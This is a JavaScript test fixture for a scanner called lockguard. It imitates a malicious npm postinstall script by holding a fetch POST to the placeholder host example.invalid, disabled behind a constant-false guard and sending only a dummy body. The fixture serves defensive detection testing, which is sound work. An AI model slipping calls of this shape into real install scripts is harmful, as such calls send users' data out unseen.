// HARMLESS TEST FIXTURE for lockguard. This imitates the shape of a malicious
// postinstall script so lockguard has something to detect, but it does nothing:
// the only statement with an effect sits behind a constant-false guard, and the
// destination is on the reserved `.invalid` TLD, which can never resolve.
'use strict';

const FIXTURE_NEVER_RUNS = false;

if (FIXTURE_NEVER_RUNS) {
  fetch('https://example.invalid/collect', { method: 'POST', body: '{"fixture":true}' });
}
